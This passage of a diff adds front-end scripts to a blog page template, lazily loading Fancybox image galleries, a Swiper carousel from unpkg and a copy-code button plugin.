+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
